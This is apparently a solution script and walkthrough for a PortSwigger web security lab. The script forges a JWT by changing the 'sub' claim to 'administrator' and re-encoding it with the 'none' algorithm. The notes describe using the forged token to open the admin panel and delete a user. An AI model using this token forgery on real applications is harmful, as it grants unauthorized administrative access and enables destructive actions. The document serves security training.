import jwt
import base64

# Paste JWT token here
token = 'eyJraWQiOiI1M2FmMDM2Yi04YjY3LTQ3NmItODE4Yy0xMGQxYTM3ZmUyZWIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NTM4NTQzMiwic3ViIjoid2llbmVyIn0.2djoRFi5z4jxULZWDd9_AW2nSVbGG8uktUzLUFZ5tsCUtyKuPypxoe0hvoMQRMP_ngty3QKfToK4-G5iCGg_BOM7t36S4AucfbENfWs-W1HGmcBhFn7e488icDxMaHJrrEN40BTe-4RNHbnbocL66n1KqulVMArUEdBw_m1NXgpGsOJrEt7RP85_tkUPzX8PrvQsSchlZo0Dw3kl5KWIeXt4VXInfyLPAGzQD5aYhLDyPaNY0bAB2FITt93-zhCyuoQSlj2Cry_Ucr_liz36xnkEsOojUjGJ-iPbWoR7XcJRHszeocDH14uivQlUDCguMmlfxOBBbRq4RyVaV5bNzQ'

# Decode the token (without verifying)
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}\n")

# Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"Modified token: {decoded_token}\n")


# Generate a new token with the modified payload (re-encode)
#Re-encode the JWT with None algotithm
modified_token = jwt.encode(decoded_token, None, algorithm="none")
print(f"Modified token: {modified_token}\n")




"""


In the lab, log in to your own account.

In Burp, go to the Proxy > HTTP history tab and look at the post-login GET /my-account request. Observe that your session cookie is a JWT.

Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the sub claim contains your username. Send this request to Burp Repeater.

In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.

Select the payload of the JWT again. In the Inspector panel, change the value of the sub claim to administrator, then click Apply changes.

Select the header of the JWT, then use the Inspector to change the value of the alg parameter to none. Click Apply changes.

In the message editor, remove the signature from the JWT, but remember to leave the trailing dot after the payload.

Send the request and observe that you have successfully accessed the admin panel.

In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
"""